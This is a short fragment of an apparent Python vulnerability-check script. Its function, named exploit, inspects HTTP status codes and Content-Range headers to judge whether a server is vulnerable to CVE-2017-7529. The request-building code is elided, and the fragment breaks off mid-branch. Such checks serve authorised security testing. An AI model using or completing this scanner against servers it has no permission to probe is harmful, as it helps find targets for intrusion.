...
def exploit(url):
    ...
    if http_response.status_code == 206 and (("Content-Range" in http_response.headers) or ("Content-Range" in http_response.text)):
        log.info("vulnerable: Vulnerable to CVE-2017-7529")
    elif http_response.status_code == 416:
        log.warning("vulnerable: Not Vulnerable (Range Not Satisfiable)")
    else:
